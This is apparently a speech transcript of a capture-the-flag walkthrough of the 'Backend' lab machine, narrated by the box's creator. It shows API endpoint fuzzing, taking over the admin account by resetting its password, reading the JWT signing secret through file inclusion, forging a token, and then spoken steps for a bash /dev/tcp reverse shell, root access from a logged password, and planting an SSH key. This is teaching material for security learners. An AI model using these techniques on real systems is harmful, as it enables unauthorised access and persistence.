 what's going on youtube this is ipsec i'm doing back again from the uhc april qualifiers and the whole idea around this box is you have access to a back-end api but no front-end so you just have to explore the api manually and i created this box because there hasn't really been a box on hack the box to my knowledge of just attacking an api there's been some boxes that involved api lately but api wasn't the main focus and there's a lot of subtle differences when doing like fuzzing across an api for instance when you're doing a go buster a dirt bust or whatever you want to call it it's not about file name and extension it's about file name and method additionally a lot of the web crawlers just don't work so we figured out a lot of those nuances in this box and hopefully it helps anyone out there that is looking for how to get started and testing an api interface so with that being said let's just jump in as always we'll start with the nmap so dash sc for default scripts sv enumerate versions oh a open all formats bring the nmap directory and call it backend then the ip address of 1010 11.161 this can take some time to run so i've already ran it looking at the results we see a lot of lines of text however we do see there's 998 closed ports and by default nmap scans the top 1000 ports so we know there's only two ports open the first port is ssh on port 22 and it's banner tells us it's an ubuntu server nothing really interesting there the second port we have is http on port 80 and its banner tells us it's uv icon if we just google this we can see it's a um asgi web server implementation for python um asgi is application service gateway interface i want to say or asynchronous server gateway interface so it's like wsgi just um with a bunch of async calls so we know this is some type of python web server um not much else there nmap doesn't exactly identify this is a web service or maybe it does it just doesn't know what type so we see a bunch of just random stuff my favorite thing is like 404 and they actually like spell it out but um the main interesting thing is we got content type application json and the server is responding to us with json so we're probably dealing with an api uh the title it doesn't have a title so there's that and then this because it didn't exactly identify the server it's outputting the whole um like socket of what it requests so you can try to better identify the service in the future so not much information in nmap uh let's just go take out or take a look at the web service so 1010 11.161 we have uhc api version 1.0 and if i look at the source code that's all there is um firefox is just making that json pretty so we can try to like use go busters things to enumerate this however when doing with apis um i actually created this box to show off ferro buster and just realized it didn't do a good job go bus shouldn't do a good job the tool kite runner that i learned from doing an ama with inside a phd didn't do a great job i'll show what i mean by that in a minute but let's do go buster dir u http 1010 11 161 forward list let's do opt um set list word list or where is it discovery web content rav small words dot text and then i think that's all we need and it's going to start brute forcing this and we get a slash docs returns a 401 and slash api returns a 200. so if i go to slash docs it's requiring some type of authentication if i go to slash api it tells me there's a v1 endpoint if i go to slash v1 it tells me there's two endpoints user and admin so if i go to slash user we get a not found if i put this in burp suite now because at this point it's going to be handy analyzing everything in burp suite because apis are very specific in the sense that they return somewhat unique http codes at this point it's not that unique now everyone knows what the 404 is if we just do the other endpoint of admin it returns a redirect to admin slash and that one tells us we're not authenticated so in api terminology um there is a user endpoint like this is probably a controller there's probably a user.pi on the server and it just doesn't have a default function typically with users the next thing is like an id number so if i do user slash 1 we do get information here if i do user 2 we don't get anything because there's no user two on the system so um we could try like other endpoints here like user login but again the api route is coded that what comes after user in this context and if it's a get request is going to be an id so we have to fuzz the actual methods so i did like a post on user login we get a different message of saying fields required but i kind of want to show like my beef with kind of the tools so if i try to do this with go buster so if i do go buster and we want to do what api v1 user and fuzz this um because it defaults like a negative status code and every page if i do like user something is doing a different code we can like say dash dash wild card [Music] i just do this we get a lot of things we have to play with the status code a lot probably hide 422 also i think 404 as well there's just a lot of just extra flags we'll have to do if i used a tool like ferro buster on this so pharaoh buster unlike um girl buster this one uses a white list so we have the status codes here and the status codes have to appear here and the api will give us different status codes than what's here um go buster if we went back to this tool it's a negative search list so this is using a deny list instead of allow list or maybe wait lists and stuff but this is a blacklist instead of waitlist type of thing so the tools definitely change there and i know a lot of people are talking to the creator of fear buster he's super responsive so maybe by the time you're watching this video if the box has been out for a week or two like fearow buster has been improved to be better at api scanning but that was my main like quote unquote beef with these tools and why i like using things like w fuzz you could use fuff but i find wfuzz has more features or at least i know how to use the features in w fuzz more so if i'm doing anything ever advanced i like just using w fuzz but dash u we can do the url so we can copy this and i'm actually going to put fuzz here because we want to fuzz things of the url we want to do dash x to change this method to a post and then dash w for word list opt sec list discovery web content and when i'm fuzzing apis i generally just use the common.txt because it's exponentially smaller than the other word list so if i fuzz this well right away get a bunch of status codes we want to now hide 404s and 405. and if we wanted to look we can go over to burp suite and see exactly what 405 is so if i do user.bashrc as i think what it had uh what was one that was 405 405 dot bashrc i want to get unprocessable entity get oh because we need to change this to post oh it's just method not allowed and then 404 is foul not found or something but 307 i don't know what that is we can look at cgi-bin and we add a slash it redirects us so anytime we have a trailing slash it's going to send us a temporary redirect to something that doesn't have that slash and here's where we'll get that different um error code of a 405 so there is a login endpoint and there should be one other one that we want to see and if you want to count the word list size difference between these since we're still waiting on this to run we can do wc-l on common.txt and also rafsmalwords.txt and you can see there's a huge difference between 4643 000 um lines so that goes much quicker and there's an endpoint called sign up so let's play with this endpoint sign up i'm going to do it over in burp suite just because it's easier to see so we do sign up we can see the um body is missing a field so i'm just going to put um user is equal to ipsec we'll just put a random field in this and what we have here is let's see expecting value do i need a line break that is not what i expected i was expecting it to say a dictionary was it wanted a dictionary or something but we do have an error with json decode so let's do um user colon ipsec like this and we have value missing so this is a bit weird um if i do this with curl it's going to behave completely differently so we'll show this real quick because i'm learning something new here burp suite is doing something i'm not understanding and what if it's adding the content type for me even though i did not specify it yeah there's no content dash type but okay let's register a user real quick so it's telling us we need two fields and the body the first one being email and the second one being password so i'm gonna do email is equal to root ipsec.rocks and we'll do the password is equal to ipsec so we do that and it says a201 created so before i move forward i just want to test this out because this is the first time i'm doing in brip suite when i did it i did it in curl and it behaved completely differently so let's do curl http 1010 11 161 api v1 user sign up and i want to make this a post request i'm going to do d user is equal to ip and i'm going to pipe it to jq and this is the error message i was expecting is value is not addict so if i go back here and i do the same thing of user is equal to ip we get a json decode error so i think burp suite is smart enough where it's saying huh um this is an api let's send it i don't know what it did uh this is bizarre to me because if i change this to be dash h content type application json it's still saying not to dict so there's something fundamentally different with these requests and i'm not sure what it is but there is something uh it's like in my head now do i troubleshoot this live or we just move on um you know me let's do it live so i'm going to do pseudo wireshark and we're going to look at what these requests look like on the wire because this is bizarre and maybe it won't be after i look at it i'm going to send this post request we're going to send this one these should be somewhat identical but how did they differ so let's search by http we can turn wireshark off and let's right click follow http stream and this one we have content type of x oh so i'm guessing because this is probably my curl yeah we can see curl here curl auto appended this application x dub dub dub thing and that's why we got value is not addict i bet if i went over to the next stream um let's do http grab this next one so this one is going to be the burp suite one we don't have a content type header and that's why we got this json decode issue so um it wasn't magically adding something it was that curl thing that magically added something and that's one of the reasons why i like doing things in burp because generally what you see is what you get if we change this content type burp tells us it is changing the content type for us but that was a long i guess segue into something that wasn't too beneficial but i learned something so hopefully you learned something we have the user created with root ipsec.rocks and a password of ipsec there was an endpoint called login so we can kind of troubleshoot this the same way we're going to hit login and i'm just going to do content type application json just so it knows it even though apparently it's not needed i guess in python um it'll have some magic like typing that says you didn't specify the content type but you sent us a dick so we're going to try to json decoder or something weird like that but um there's probably a dragon somewhere in there and by a dragon i mean like a weird bug that you can do of like type confusion because if you gave it the um x dub dub dub url encoded this content type i never sent it to the json but if you didn't give it anything then it did so you definitely go down weird paths of logic in python with that change at least the fast api library but i'm just ranting at this point so let's get back to this we make a request to login and it tells us we need two fields and a body username and password so i'm going to do username is equal to root at ipsec dot rocks and we'll do password is equal to ipsec we go in and it's still telling us the fields are missing so maybe this endpoint isn't expecting json data maybe this is x dub dub dub uh what is it is it url encoded let's just look at this and copy and paste the exact field that's not it stream equals zero follow here we go this is the field for sending url encoded data and then we can just change username and password so we do username is equal to this and password is equal to ipsec we go to login and it gives us a jwt tokens so we have access token and then this string this is really just a jwt so now we can authenticate to the application so if i make a request to slash docs it says not authenticated but let's add our jwt in there so i'm going to send this we should be intercepting here we go and i'm going to add the authorization header because this is how jwts are used it's a bearer token i'm going to copy this and forward it and then it's going to make a request to open api.json we put a bearer token in there and then we have the documentation of the api so the default routes this is just um all the hard coding i did to point you to api v1 um we may go over this a little bit at the end but we can just hide this and see how this is so this is i think called swagger documentation of something it's just automatic documentation that's made by the open api.json file it's not a fast api thing but all fast apis have this and fast api is just the library i use to create this api server if you google python fast api you can pull it up so as like flask and django is to making websites fast api is to making apis in python it's super amazing um there is this secret flag endpoint we can see and it tells us it's the user flag so if i click try it out click execute we can see it responds with user.txt so that's the very first flag in this um we also have this update password and it wants guide and password and then we also have like checks on admin and we can see just from these routes why user for ford on slash user because if i look here there's nothing defined for just user it goes straight into endpoints underneath of user in admin it has a thing on just regular admin and it's an admin check it checks if you're an admin and right now it says unauthorized not authenticated because we're not authenticated the application we can click on this little lock and um this an authenticator cell so if i do root ipsec dot rocks type a secret password of ipsec and click authorize it's going to authenticate us and now when i click on this it just says results false because our user is not an admin if i go up to this user id we can do one see the response um this one is admin at hdb.local and it is a super user so probably admin i'm going to copy his guide because that update pass did reference it but i do want to show what my account looks like of a super user is false for me so i'm going to go down to the update pass i'm going to click try it out i'm going to put in the guide for admin and the password will be please subscribe click execute and we can see um it looks like it updated and we have a new hash password i bet we could crack that and the crack would come out to be please subscribe but why do that when we can just try to authenticate so i'm going to log out and we'll log back in with admin hdb.local password up please subscribe and now i'm hating myself making that password because there's a lot of characters i can typo but i didn't and we log in i can hit this admin check and we see the result is now true so i am an admin and if i make a request to this file if we do try it out we can do etsy passwd and we can see the contents of the passwd file now there was another endpoint exact to execute a command xq commands is so much sexier than getting files off the server so i'm just going to run the who am i command and we get a error message that says the debug key is missing from the jwt so we have to find a way to put debug in our jwt and the jwt is just this token so at this point we could look at what a token looks like so if i just go to like jwt.io which is the best way to parse these paste it in we can see the data it's an access token it was expired it was issued at subscriber is super user and good so there's not much information here but we want to add a debug flag in here so in order to do that we have to find where the secret signing key is and we do have an lfi on this application so we can potentially find that i was seeing if i could make this box um go up but i can't so what i'm going to do is intercept a request and we do it in burp so when we send files we can see them without scrolling so go to proxy repeater like this and we get the file so i'm going to go to slash proc self cmd line because i like checking this out and we can see i'm in home hdb uhc virtual environment python 3 and not much more information there so i'm going to check the environment so proc self environ and we have the app module app.main so this file is in the app directory and it's main.pi and the working directory is home htb uhc so if we combine that so home hdb uhc app main.pi get the source code here so let's copy this and we'll put it in let's see i wonder if i just do echo and print it it still prints the ends so i'm going to just type this main.pi set paste and then we'll do a search and replace for backslash n and replace it with um a real line break that was wrong i never get that right the first time uh search for backslash n and replace it with backslash arb try that one there we go so now we have something it's not perfect uh because it's still escaping a lot of things we didn't want to escape like these quotes but the main thing i wanted from this app is to identify how it's signing it so i'm going to look at the import statements and one of these will probably stick out we have a from app.cor.config on line 20 and it's importing settings but i just want to get this config file so let's go back here we can do app core config.pi and then we want to copy this and then vi config.pi paste and let's clean this up there we go and we have a jwt secret of super secret signing key dash htb so i always hate just copying out of vim for some reason i never have good luck with it so i'm going to go over to less so i can copy and paste this and i'm going to go back to jwt dot il and i'm going to change this to add debug is equal to true or colon true and i'm going to erase the year 256 bit signature put in my key i always hit home and end when on this to make sure i didn't copy and paste wrong my biggest pain with this is it's like your secret it has something and i always like will click somewhere here paste it in and this looks like i have it but because on this website it's not default um you get some of the default values it has so one of the things i always double check when i'm here is hit home and to make sure it begins and ends with what i want but that's besides the point we can probably go here let's just for this one request to make that happy and then i'm going to go down to exec and now let's test if we can run a command so burp suite is intercepting we can click execute good repeater tab we have debug key is missing but if i take the key that we have just forged and signed on jwt dot io we should have the debug flag and it responds with hdb now the issue here is going to be um we can't use slashes because anytime we put a slash in it's going to change how the thing behaves so if i try like echo abc and we probably have to do a plus here and maybe percent 20 we have abc if i put a slash here it's not found because we're changing the end point and i think a slash is 2f and we still get not found so slashes are really bad characters in a payload so we want to avoid those best way to avoid it is use base64 so i'm going to do an echo and we'll do um bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 like that i'm gonna put it in single quotes basic 4-w-0 now there's one potential issue here um that plus is going to cause an issue we could get rid of like the special characters by doing this and just putting a space where you think those are and this and kind of getting rid of those we can probably get rid of that equal and now we just have a pure alphanumeric payload which i think this will work easily so we can show this working real quick but i just want to show one of the common mistakes i see people make when they do this so we want to exec echo dash n paste in the base64 decode it execute bash and this will work because our payload is alphanumeric or maybe it won't um i guess because we can't use pluses so my whole thing is irrelevant because we have to encode all characters anyways so if encode all characters we get the shell um what i was gonna say is with this one we have to make sure this plus is encoded but because we had to encode anyways it doesn't matter um if i get rid of this we can go to this one payload here that has pluses in it and it's still going to work so us taking the care and making um the base64 alphanumeric really saved us no time but i always like doing it because it can be a bad issue in edge cases and you may miss things it may just burn a lot of time and it takes a few seconds to make sure that's alphanumeric but we can see that one worked as well so now we have a shell on the box so i'm going to do python3 dash c import pty pty dot spawn ben bash okay sdty raw minus echo foreground hit enter twice and now we have a real shell on this and the thing that really sticks out is auth.log and if i look at it we can see authentication attempts so logging success admin at http.local we have a failure and then more successes and we can see these are logins but one of the common things if you ever look at auth logs is users accidentally typing in the password in the username field so in this case that's what happened if we just do su we can switch to the root user like that and pop the box that way but i want to look at the actual fast api code so we can kind of talk more about the routes before we just end this video so i'm going to go in ssh and let's just drop our private key or public key there so sh key gen dash f i'm gonna call this back end i guess cat backend.pub and we'll put this in authorized keys let's see here echo two authorized keys now if i sh dash i backend root at 10 10 11 161 does it let me in it does so we can scp the file so i'm going to scp root and we want home hdb uhc which is where the application is put it and just our directory um i had to specify dash r to be recursive because it is a folder i probably should have turned that up before sending it because this is going to take a while so let's ctrl c this go back over here hdb tar dassey jvf uhc turbo bz2 uhc and then we can just download uhc tar bz2 wait for this to finish copying so i'm going to pause the video to let this turret finish and there we go um we have the tar we can now scp it back to ourselves and then while that goes um let's see do i have codium i do open up codium star xjvf uhc let's see this is altered source code that's fine so cjvfuhc.tar.ez2 and let's go into the folder so uhc uh this box is backend uhc okay and here we have the code for this so if i go in app we got main.pi this is where it imports everything and here are just the default endpoints i had created like i said before hitting a directory and it telling you the endpoints isn't something that's common but this whole api v1 i think this is how fast api documentation does it so i don't want to make people guess that's what was happening so i kind of like handheld the way through that but if we go into the api directory into v1 into endpoints we can see how it kind of works so all i do is router.get and this is specifying user id and here i'm doing crud which um i forget what that stands for um it's another web application nomenclature i think it's like create remove update delete yeah that's what it is so it's just basic database nomenclature how to manage databases um if i went into let's see where is crud stored it's an app so if i do app oh crud right here so my crud user i have a class here i have functions get by email or update i have a special thing for update because i'm going to take in a plain text password and replace it with the hash password but um it's different so if you want to look at like fast api documentation or how i learned um i just used the ultimate fast api uh tutorial i think this is it this is when i was learning fast api i followed this tutorial and when i did it i think they stopped at authenticating via jwt but that's a good starting point but we can see here in this we have definitions right so router dot get slash user id router.post slash login so this is why we have to fuzz by methods because of just how these routes work it's looking for put put methods on secret flag endpoint generally speaking like get is going to get data post is going to create or do a login put is going to update something there's like delete which will remove things but yeah i didn't really plan on explaining this much i'm probably not doing a great job but um yeah i hope this somewhat makes sense and uh yeah take care guys and i'll see you all next time